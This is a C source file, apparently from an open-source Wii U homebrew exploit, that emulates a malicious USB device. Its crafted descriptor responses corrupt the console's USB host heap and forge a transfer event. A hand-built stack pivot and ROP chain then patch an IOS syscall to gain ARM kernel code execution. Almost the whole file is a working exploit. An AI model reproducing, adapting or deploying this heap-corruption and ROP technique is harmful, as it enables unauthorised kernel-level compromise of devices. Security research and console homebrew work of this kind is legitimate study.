/*
 *   Copyright (C) 2022 GaryOderNichts
 *
 *   This program is free software; you can redistribute it and/or modify it
 *   under the terms and conditions of the GNU General Public License,
 *   version 2, as published by the Free Software Foundation.
 *
 *   This program is distributed in the hope that it will be useful,
 *   but WITHOUT ANY WARRANTY; without even the implied warranty of
 *   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *   GNU General Public License for more details.
 *
 *   You should have received a copy of the GNU General Public License
 *   along with this program.  If not, see <https://www.gnu.org/licenses/>.
 */

#include "common.h"
#include "types.h"

#include "../arm_kernel/arm_kernel.bin.h"

static const uint8_t heap_repair_data_full_speed[] = {
#include "data-0x102ad880-full-speed.inc"
};

#ifndef NO_HIGH_SPEED
#error high speed not supported for dev mode yet
static const uint8_t heap_repair_data[] = {
#include "data-0x102ad880.inc"
};
#endif

#define DEVICE_VENDOR_ID  0xabcd
#define DEVICE_PRODUCT_ID 0x1234

// custom request to upload data into the stack
#define USB_REQ_CUSTOM 0x30

// location of the pEp0DmaBuf (containing the final rop, arm kernel and event)
#define EP0DMABUF_LOCATION 0x1029d8e0u
// location of the last descriptor storing data
#define LAST_DESC_LOCATION 0x102ab3a0u
#define LAST_DESC_LOCATION_HS 0x102a7fe0u
// location of the UhsCtrlXferMgr structure
#define CTRL_MGR_LOCATION 0x102b50a0u
#define CTRL_MGR_LOCATION_HS 0x102b0860u
// offset to the repair data we need to copy
#define HEAP_REPAIR_OFFSET 0x2540
#define HEAP_REPAIR_OFFSET_HS 0x58a0

// final rop after the stackpivot
#define FINAL_ROP_OFFSET 0x100
#define FINAL_ROP_LOCATION (EP0DMABUF_LOCATION + FINAL_ROP_OFFSET)

// stores the arm kernel binary before it gets copied into kernel memory
#define ARM_KERNEL_OFFSET 0x500
#define ARM_KERNEL_LOCATION (EP0DMABUF_LOCATION + ARM_KERNEL_OFFSET)

// custom event
#define CUSTOM_EVENT_OFFSET 0x2000
#define CUSTOM_EVENT_LOCATION (EP0DMABUF_LOCATION + CUSTOM_EVENT_OFFSET)

// the beginning of IOS_SetFaultBehaviour
// this is the syscall we patch to execute functions with kernel permissions
#define REPLACE_SYSCALL 0x081298bcu

// the location from where our arm kernel binary runs
#define ARM_CODE_BASE 0x08135000u

#define IOS_SHUTDOWN 0x1012ee4cu

/*
    We'll use a flaw in IOS_Create thread to memset code with kernel permissions
    <https://wiiubrew.org/wiki/Wii_U_system_flaws#ARM_kernel>
    We can use this to nop out parts of code
*/
#define IOS_CREATE_THREAD(function, arg, stack_top, stack_size, priority, flags) \
    0x101236f2 | 1, /* pop {r1, r2, r3, r4, r5, r6, r7, pc} */ \
    arg, \
    stack_top, \
    stack_size, \
    0, \
    0, \
    0, \
    0, \
    0x1012eabc, /* IOS_CreateThread */ \
    priority, \
    flags

/*
    When nop'ing out 08129734-0812974c IOS_SetPanicBehaviour can be turned into an arbitrary write
*/
#define KERN_WRITE32(address, value) \
    0x10123a9e | 1, /* pop {r0, r1, r4, pc} */ \
    address, \
    value, \
    0, \
    0x10123a8a | 1, /* pop {r3, r4, pc} */ \
    1, /* r3 must be 1 for the arbitrary write */ \
    0, \
    0x1010cd18, /* mov r12, r0; mov r0, r12; add sp, sp, #0x8; pop { pc } */ \
    0, \
    0, \
    0x1012ee64, /* IOS_SetPanicBehaviour */ \
    0, \
    0

static const uint32_t final_rop[] = {
    /* mov gadget into lr */
    0x10123a9e | 1, // pop {r0, r1, r4, pc}
    0x10101638, // pop {r4, r5, pc} (will be in lr)
    0,
    0,
    0x1012cfec, // mov lr, r0; mov r0, lr; add sp, sp, #0x8; pop {pc}
    0,
    0,

    /* nop out parts of IOS_SetPanicBehaviour for KERN_WRITE32 */
    IOS_CREATE_THREAD(0, 0, 0x0812974c, 0x68, 1, 2),

    /* patch IOS_SetFaultBehaviour to load our custom kernel code */
    KERN_WRITE32(REPLACE_SYSCALL + 0x00, 0xe92d4010), // push { r4, lr }
    KERN_WRITE32(REPLACE_SYSCALL + 0x04, 0xe1a04000), // mov r4, r0
    KERN_WRITE32(REPLACE_SYSCALL + 0x08, 0xe3e00000), // mov r0, #0xffffffff
    KERN_WRITE32(REPLACE_SYSCALL + 0x0c, 0xee030f10), // mcr p15, #0, r0, c3, c0, #0 (set dacr to r0)
    KERN_WRITE32(REPLACE_SYSCALL + 0x10, 0xe1a00004), // mov r0, r4
    KERN_WRITE32(REPLACE_SYSCALL + 0x14, 0xe12fff33), // blx r3
    KERN_WRITE32(REPLACE_SYSCALL + 0x18, 0x00000000), // nop
    KERN_WRITE32(REPLACE_SYSCALL + 0x1c, 0xee17ff7a), // clean_loop: mrc p15, 0, r15, c7, c10, 3
    KERN_WRITE32(REPLACE_SYSCALL + 0x20, 0x1afffffd), // bne clean_loop
    KERN_WRITE32(REPLACE_SYSCALL + 0x24, 0xee070f9a), // mcr p15, 0, r0, c7, c10, 4
    KERN_WRITE32(REPLACE_SYSCALL + 0x28, 0xe1a03004), // mov r3, r4
    KERN_WRITE32(REPLACE_SYSCALL + 0x2c, 0xe8bd4010), // pop { r4, lr }
    KERN_WRITE32(REPLACE_SYSCALL + 0x30, 0xe12fff13), // bx r3 (our code)

    /* flush dcache */
    0x10123a9e | 1, // pop {r0, r1, r4, pc}
    REPLACE_SYSCALL,
    0x4001, // > 0x4000 flushes all data cache
    0,
    0x1012ed4c, // IOS_FlushDCache
    0,
    0,

    /* call syscall with kern location for kernel code execution */
    0x10123a9e | 1, // pop {r0, r1, r4, pc}
    ARM_CODE_BASE,
    0,
    0,
    0x101063da | 1, // pop {r1, r2, r5, pc}
    0,
    arm_kernel_size,
    0,
    0x10123982 | 1, // pop {r1, r3, r4, r6, pc}
    ARM_KERNEL_LOCATION,
    0x08131d04, // kern_memcpy
    0,
    0,
    0x1012ebb4, // IOS_SetFaultBehaviour (our patched syscall to gain kernel code execution)
    0,
    0,
    0x101312d0, // jump to arm_user
};

static const uint32_t stackpivot_rop[] = {
    /* copy the final rop into the lower stack */
    0x10123a9e | 1, // pop {r0, r1, r4, pc}
    0x1015bfa8, // dest
    0,
    0,
    0x101063da | 1, // pop {r1, r2, r5, pc}
    FINAL_ROP_LOCATION, // src
    sizeof(final_rop), // size
    0,
    0x10106d4c, // bl memcpy; mov r0, #0x0; pop {r4, r5, pc}

    /* mov gadget into lr */
    0x10101638, // pop {r4, r5, pc} (will be in lr)
    0,
    0x10103bd4, // mov r0, r4; pop {r4, pc}
    0,
    0x1012cfec, // mov lr, r0; mov r0, lr; add sp, sp, #0x8; pop {pc}
    0,
    0,

    /* nop out code for stackpivot */
    IOS_CREATE_THREAD(0, 0, 0x101001dc, 0x68, 1, 2),

    /* pivot the stack */
    0x101063da | 1, // pop {r1, r2, r5, pc}
    0,
    -0xf000, // stack offset (pivots the stack into 0x1015bfa8)
    0,
    0x10100280, // pop {r4-r11, pc}
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0x4, // r11 must be 4 to match pid check
    0x1012ea68, // stack pivot
};

// custom event to transfer data anywhere
static const ControlTransactionEvent xferEventData = {
    .header = {
        .index = 0,
        .queue = 0, // will be filled out below once used
        .prev = 0,
        .next = 0, // will be filled out below once used
    },
    .bmRequestType = USB_DIR_IN,
    .bRequest = USB_REQ_CUSTOM, // custom request
    .wValue = 0,
    .wIndex = 0,
    .wLength = cpu_to_be16(sizeof(stackpivot_rop) + 4),
    // background thread stack (everything below 0x1016AD70 crashes)
    .buffer = cpu_to_be32(0x1016ad70u),
    .argptr = 0,
    .timeout = cpu_to_be32(7500000u),
    .result = 0,
    // SP will be 0x1016ace4 when the callback is called
    .callback = cpu_to_be32(0x10103084u), // add sp, sp, #0x84; pop {r4, r5, r6, pc}
};

static struct usb_device_descriptor device_descriptor = {
    .bLength            = USB_DT_DEVICE_SIZE,
    .bDescriptorType    = USB_DT_DEVICE,
    .bcdUSB             = cpu_to_le16(0x200),
    .bDeviceClass       = USB_CLASS_PER_INTERFACE,
    .bDeviceSubClass    = 0,
    .bDeviceProtocol    = 0,
    .bMaxPacketSize0    = 0, // will be set in device_bind
    .idVendor           = cpu_to_le16(DEVICE_VENDOR_ID),
    .idProduct          = cpu_to_le16(DEVICE_PRODUCT_ID),
    .bcdDevice          = cpu_to_le16(0x100),
    .iManufacturer      = 0,
    .iProduct           = 0,
    .iSerialNumber      = 0,
    .bNumConfigurations = 0,
};

static const struct usb_config_descriptor config_descriptor = {
    .bLength                = USB_DT_CONFIG_SIZE,
    .bDescriptorType        = USB_DT_CONFIG,
    .wTotalLength           = cpu_to_le16(USB_DT_CONFIG_SIZE),
    .bNumInterfaces         = 0,
    .bConfigurationValue    = 0,
    .iConfiguration         = 0,
    .bmAttributes           = USB_CONFIG_ATT_ONE | USB_CONFIG_ATT_SELFPOWER,
    .bMaxPower              = 50,
};

int device_bind(udpih_device_t* device, uint16_t maxpacket)
{
    device_descriptor.bMaxPacketSize0 = cpu_to_le16(maxpacket);

    return 0;
}

int device_setup(udpih_device_t *device, const struct usb_ctrlrequest *ctrlrequest, uint8_t *buf, bool high_speed)
{
    int result = -EINVAL;

    uint16_t wValue = le16_to_cpu(ctrlrequest->wValue);
    uint16_t wIndex = le16_to_cpu(ctrlrequest->wIndex);
    uint16_t wLength = le16_to_cpu(ctrlrequest->wLength);

    DEBUG("device_setup: bRequest 0x%x bRequestType 0x%x wValue 0x%x wIndex 0x%x wLenght 0x%x\n", ctrlrequest->bRequest, ctrlrequest->bRequestType, wValue, wIndex, wLength);

    switch (ctrlrequest->bRequest) {
    case USB_REQ_GET_DESCRIPTOR: {
        uint8_t type = wValue >> 8;
        uint8_t index = wValue & 0xff;
        switch (type) {
        case USB_DT_DEVICE: {
            result = min((size_t) wLength, sizeof(device_descriptor));
            struct usb_device_descriptor* desc = (struct usb_device_descriptor*) buf;
            memcpy(desc, &device_descriptor, result);

            switch (device->state) {
            case STATE_DEVICE0_CONNECTED:
                desc->bNumConfigurations = 7;
                break;
            case STATE_DEVICE1_CONNECTED:
                desc->bNumConfigurations = 1;
                break;
            case STATE_DEVICE2_CONNECTED:
                desc->bNumConfigurations = 3;
                break;
            }
        }
            break;
        case USB_DT_CONFIG: {
            result = 0;
            memset(buf, 0, wLength);
            memcpy(buf, &config_descriptor, sizeof(config_descriptor));
            result += sizeof(config_descriptor);
            struct usb_config_descriptor* desc = (struct usb_config_descriptor*) buf;

            if (device->state == STATE_DEVICE0_CONNECTED) {
                // everything above 0xca0 will be placed at the end of the heap
                const uint32_t descriptor0_size = high_speed ? 0xf260 : 0xaa20;
                const uint32_t descriptor1_size = 0xca0; //<- this one just fills up that annoying heap hole
                const uint32_t descriptor2_size = 0x40;
                const uint32_t descriptor3_size = 0x40;
                const uint32_t descriptor4_size = 0x40;
                const uint32_t descriptor5_size = 0x40 * 3;
                const uint32_t descriptor6_size = 0x2380; // <- point into the middle of the pEp0DmaBuf

                switch (wIndex) {
                case 0:
                    if (wLength == sizeof(config_descriptor)) {
                        desc->wTotalLength = cpu_to_le16(descriptor0_size);
                    }
                    else {
                        memset(desc + 1, 1, descriptor0_size - sizeof(config_descriptor));

                        // corrupt magic and jump over the 2 headers
                        buf[descriptor0_size - 4] = sizeof(HeapBlockHeader) * 2 + 4;
                        buf[descriptor0_size - 3] = USB_DT_ENDPOINT;
                        
                        desc->wTotalLength = cpu_to_le16(descriptor0_size + descriptor2_size + descriptor3_size + descriptor4_size + descriptor5_size + sizeof(HeapBlockHeader) * 8);
                        result = descriptor0_size;
                    }
                    break;
                case 1:
                    // weird uhs quirk, the inital read size of the next config descriptor is the length of the previous one
                    if (wLength != descriptor1_size/*sizeof(config_descriptor)*/) {
                        desc->wTotalLength = cpu_to_le16(descriptor1_size);
                        result = 0xffff;
                    }
                    else {
                        memset(desc + 1, 0, descriptor1_size - sizeof(config_descriptor));

                        desc->wTotalLength = cpu_to_le16(sizeof(config_descriptor));
                        result = descriptor1_size;
                    }
                    break;
                case 2:
                    if (wLength != descriptor2_size) {
                        desc->wTotalLength = cpu_to_le16(descriptor2_size);
                        result = 0xffff;
                    }
                    else {
                        memset(desc + 1, 1, descriptor2_size - sizeof(config_descriptor));

                        // jump over the 2 headers
                        buf[descriptor2_size - 1] = sizeof(HeapBlockHeader) * 2 + 1;

                        desc->wTotalLength = cpu_to_le16(descriptor2_size);
                        result = descriptor2_size;
                    }
                    break;
                case 3:
                    if (wLength != descriptor3_size) {
                        desc->wTotalLength = cpu_to_le16(descriptor3_size);
                        result = 0xffff;
                    }
                    else {
                        memset(desc + 1, 1, descriptor3_size - sizeof(config_descriptor));

                        // corrupt magic and jump over the 2 headers
                        buf[descriptor3_size - 4] = sizeof(HeapBlockHeader) * 2 + 4;
                        buf[descriptor3_size - 3] = USB_DT_ENDPOINT;

                        desc->wTotalLength = cpu_to_le16(descriptor3_size);
                        result = descriptor3_size;
                    }
                    break;
                case 4:
                    if (wLength != descriptor4_size) {
                        desc->wTotalLength = cpu_to_le16(descriptor4_size);
                        result = 0xffff;
                    }
                    else {
                        memset(desc + 1, 1, descriptor4_size - sizeof(config_descriptor));

                        // jump over the 2 headers
                        buf[descriptor4_size - 1] = sizeof(HeapBlockHeader) * 2 + 1;

                        desc->wTotalLength = cpu_to_le16(descriptor4_size);
                        result = descriptor4_size;
                    }
                    break;
                case 5:
                    if (wLength != descriptor5_size) {
                        desc->wTotalLength = cpu_to_le16(descriptor5_size);
                        result = 0xffff;
                    }
                    else {
                        memset(desc + 1, 1, descriptor5_size - sizeof(config_descriptor));

                        // corrupt magic
                        buf[descriptor5_size - 4] = 4;
                        buf[descriptor5_size - 3] = USB_DT_ENDPOINT;

                        desc->wTotalLength = cpu_to_le16(descriptor5_size);
                        result = descriptor5_size;
                    }
                    break;
                case 6:
                    if (wLength != descriptor6_size) {
                        desc->wTotalLength = cpu_to_le16(descriptor6_size);
                        result = 0xffff;
                    }
                    else {
                        memset(desc + 1, 1, descriptor6_size - sizeof(config_descriptor));
                        
                        desc->wTotalLength = cpu_to_le16(descriptor6_size);
                        result = descriptor6_size;
                    }
                    break;
                default:
                    break;
                }
            } else if (device->state == STATE_DEVICE1_CONNECTED) {
                const uint32_t descriptor0_size = 0x10;
                switch (wIndex) {
                case 0:
                    if (wLength == sizeof(config_descriptor)) {
                        desc->wTotalLength = cpu_to_le16(descriptor0_size);
                    }
                    else {
                        memset(desc + 1, 1, descriptor0_size - sizeof(config_descriptor));

                        // swap the next pointer, which will now point into the middle of the heap :D
                        buf[descriptor0_size - 1] = 10 + 0x10;

                        desc->wTotalLength = cpu_to_le16(descriptor0_size + 10 + 0x10 + 0x2c);
                        result = descriptor0_size;
                    }
                    break;
                default:
                    break;
                }
            } else if (device->state == STATE_DEVICE2_CONNECTED) {
                const uint32_t last_desc_location = high_speed ? LAST_DESC_LOCATION_HS : LAST_DESC_LOCATION;
                const uint32_t ctrl_mgr_location = high_speed ? CTRL_MGR_LOCATION_HS : CTRL_MGR_LOCATION;
                const uint32_t ctrl_mgr_offset = ctrl_mgr_location - last_desc_location;

                const uint32_t descriptor0_size = high_speed ? 0xe2a0 : 0xaa40; // <- fill up heap holes
                const uint32_t descriptor1_size = high_speed ? (0x5380 + sizeof(HeapBlockHeader)) : 0x8760;
                const uint32_t descriptor2_size = ctrl_mgr_offset + sizeof(UhsCtrlXferMgr);

                switch (wIndex) {
                case 0:
                    if (wLength == sizeof(config_descriptor)) {
                        desc->wTotalLength = cpu_to_le16(descriptor0_size);
                        result = 0xffff;
                    }
                    else {
                        memset(desc + 1, 0, descriptor0_size - sizeof(config_descriptor));

                        desc->wTotalLength = cpu_to_le16(sizeof(config_descriptor));
                        result = descriptor0_size;
                    }
                    break;
                case 1:
                    if (wLength != descriptor1_size) {
                        desc->wTotalLength = cpu_to_le16(descriptor1_size);
                        result = 0xffff;
                    }
                    else {
                        memset(desc + 1, 0, descriptor1_size - sizeof(config_descriptor));

                        // this is where the next pointer will point to
                        // add a large heap header here
                        HeapBlockHeader* hdr = (HeapBlockHeader*) (buf + 0x5320);
                        hdr->magic = cpu_to_be32(0xBABE0000u);
                        hdr->size = cpu_to_be32(0x100000u);
                        // make sure the previous block gets updated
                        hdr->prev = cpu_to_be32(0x102c0580u);
                        hdr->next = 0;

                        desc->wTotalLength = cpu_to_le16(sizeof(config_descriptor));
                        result = descriptor1_size;
                    }
                    break;
                case 2:
                    if (wLength != descriptor2_size) {
                        desc->wTotalLength = cpu_to_le16(descriptor2_size);
                        result = 0xffff;
                    }
                    else {
                        memset(desc + 1, 0, descriptor2_size - sizeof(config_descriptor));

                        // final rop will be placed at FINAL_ROP_LOCATION
                        uint32_t* u32buf = (uint32_t*) (buf + FINAL_ROP_OFFSET);
                        int i;
                        for (i = 0; i < sizeof(final_rop) / 4; ++i) {
                            u32buf[i] = cpu_to_be32(final_rop[i]);
                        }

                        // kernel bin will be placed at ARM_KERNEL_LOCATION
                        memcpy(buf + ARM_KERNEL_OFFSET, arm_kernel, arm_kernel_size);

                        // custom event will be placed at CUSTOM_EVENT_LOCATION
                        ControlTransactionEvent* xferEvent = (ControlTransactionEvent*) (buf + CUSTOM_EVENT_OFFSET);
                        memcpy(xferEvent, &xferEventData, sizeof(ControlTransactionEvent));
                        xferEvent->header.queue = cpu_to_be32(ctrl_mgr_location + offsetof(UhsCtrlXferMgr, control_transaction_queue));
                        xferEvent->header.next = cpu_to_be32(ctrl_mgr_location + offsetof(UhsCtrlXferMgr, events)); // can't be 0, so point into the events buf

                        // copy heap repair data
#ifndef NO_HIGH_SPEED
                        if (high_speed) {
                            memcpy(buf + HEAP_REPAIR_OFFSET_HS, heap_repair_data, sizeof(heap_repair_data));
                        } else
#endif
                        {
                            memcpy(buf + HEAP_REPAIR_OFFSET, heap_repair_data_full_speed, sizeof(heap_repair_data_full_speed));
                        }

                        // insert the custom event into the queue
                        UhsCtrlXferMgr* xferMgr = (UhsCtrlXferMgr*) (buf + ctrl_mgr_offset);
                        xferMgr->control_transaction_queue.numItems = cpu_to_be32(1);
                        xferMgr->control_transaction_queue.first = cpu_to_be32(CUSTOM_EVENT_LOCATION);
                        xferMgr->control_transaction_queue.last = cpu_to_be32(CUSTOM_EVENT_LOCATION);

                        desc->wTotalLength = cpu_to_le16(sizeof(config_descriptor));
                        result = descriptor2_size;
                    }
                    break;
                }
            }

            result = min((int) wLength, result);
        }
            break;
        case USB_DT_STRING:
            // don't need a string desc
            result = SETUP_NO_DATA;
            break;
        default:
            WARNING("GET_DESCRIPTOR: Unknown descriptor type 0x%x\n", type);
            break;
        }
        break;
    }
    case USB_REQ_SET_CONFIGURATION: {
        if (ctrlrequest->bRequestType != 0) {
            WARNING("USB_REQ_SET_CONFIGURATION: Invalid request type\n");
            break;
        }

        // Device is now ready
        if (device->state == STATE_DEVICE0_CONNECTED) {
            device->state = STATE_DEVICE0_READY;
            device->set_state_timer(device, 200);
        } else if (device->state == STATE_DEVICE1_CONNECTED) {
            device->state = STATE_DEVICE1_READY;
            device->set_state_timer(device, 200);
        }

        result = 0;
        break;
    }
    case USB_REQ_CUSTOM: {
        memset(buf, 0, wLength);

        uint32_t* u32buf = (uint32_t*) (buf + 4);
        int i;
        for (i = 0; i < sizeof(stackpivot_rop) / 4; ++i) {
            u32buf[i] = cpu_to_be32(stackpivot_rop[i]);
        }

        result = wLength;
        break;
    }
    default:
        WARNING("Unknown request 0x%x\n", ctrlrequest->bRequest);
        break;
    }

    return result;
}
